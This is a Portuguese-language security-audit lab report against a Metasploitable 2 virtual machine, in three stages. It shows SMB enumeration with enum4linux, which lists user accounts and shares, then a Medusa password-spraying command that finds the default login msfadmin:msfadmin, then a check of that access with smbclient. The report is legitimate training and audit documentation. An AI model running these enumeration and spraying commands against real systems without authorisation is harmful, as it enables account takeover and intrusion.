# Etapa 1 — Enumeração SMB e Identificação de Usuários

**Projeto:** Laboratório de Auditoria de Segurança  
**Alvo:** Metasploitable 2  
**IP:** `192.168.56.101`  
**Ferramenta:** Enum4linux v0.9.1  
**Serviço:** SMB/Samba

## 1. Comando executado

```bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```

## 2. Resultados obtidos

| Informação | Resultado |
|---|---|
| Hostname | METASPLOITABLE |
| Workgroup | WORKGROUP |
| Samba | 3.0.20-Debian |
| Sessão anônima | Permitida |
| Usuários identificados | 34 |
| Compartilhamentos | 5 |

## 3. Usuários identificados

```text
games
nobody
bind
proxy
syslog
user
www-data
root
news
postgres
bin
mail
distccd
proftpd
dhcp
daemon
sshd
man
lp
mysql
gnats
libuuid
backup
msfadmin
telnetd
sys
klog
postfix
service
list
irc
ftp
tomcat55
sync
uucp
```

## 4. Compartilhamentos SMB

| Compartilhamento | Resultado |
|---|---|
| print$ | Acesso negado |
| tmp | Mapeamento e listagem permitidos |
| opt | Acesso negado |
| IPC$ | Identificado |
| ADMIN$ | Acesso negado |

## 5. Conclusão técnica

A enumeração SMB identificou 34 contas de usuários e cinco compartilhamentos no servidor Metasploitable 2. Também foi confirmada a possibilidade de estabelecer uma sessão anônima, sem informar usuário e senha.



# Etapa 2 — Password Spraying SMB

**Projeto:** Laboratório de Auditoria de Segurança  
**Alvo:** Metasploitable 2  
**IP:** `192.168.56.101`  
**Ferramenta:** Medusa v2.3  
**Módulo:** smbnt

## 1. Comando executado

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

## 2. Resultado obtido

```text
ACCOUNT FOUND: [smbnt]
Host: 192.168.56.101
User: msfadmin
Password: msfadmin
[SUCCESS (ADMIN$ - Access Allowed)]
```

## 3. Resumo do teste

| Item | Resultado |
|---|---|
| Usuários testados | 3 |
| Senhas testadas | 4 |
| Combinação identificada | msfadmin / msfadmin |
| Serviço | SMB |
| Compartilhamento | ADMIN$ |
| Resultado | Acesso permitido |

## 4. Conclusão técnica

O teste de Password Spraying identificou credenciais válidas para o serviço SMB. A combinação `msfadmin:msfadmin` foi aceita pelo servidor, com confirmação de acesso ao compartilhamento administrativo `ADMIN$`.

O resultado demonstra o risco associado ao uso de credenciais previsíveis ou padrões em serviços de rede.


# Etapa 3 — Validação de Acesso SMB

## 1. Comando executado

```bash
smbclient -L //192.168.56.101 -U msfadmin
```

## 2. Resultado obtido

Autenticação realizada com o usuário `msfadmin`.

Compartilhamentos identificados:

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service
ADMIN$          IPC       IPC Service
msfadmin        Disk      Home Directories
```

## 3. Conclusão técnica

A validação manual confirmou que as credenciais identificadas pelo Medusa permitem autenticação no serviço SMB. Após a conexão, foi possível consultar a lista de compartilhamentos disponibilizados pelo servidor, incluindo o diretório pessoal `msfadmin`.